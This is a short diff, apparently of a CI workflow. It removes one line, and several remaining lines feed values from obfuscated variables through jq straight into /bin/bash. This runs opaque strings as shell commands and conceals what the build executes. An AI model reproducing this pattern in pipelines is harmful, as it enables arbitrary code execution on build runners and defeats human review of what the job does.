@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$ldry8" | jq -r .c33 | /bin/bash
           printf '%s' "$kc410" | jq -r .nu81846 | /bin/bash
           printf '%s' "$qbnl8" | jq -r .r7 | /bin/bash
-          echo $gg18783 | jq -r .lt16 | /bin/bash
           echo $rj5025 | jq -r .ya0803 | /bin/bash
 
       - name: Store output
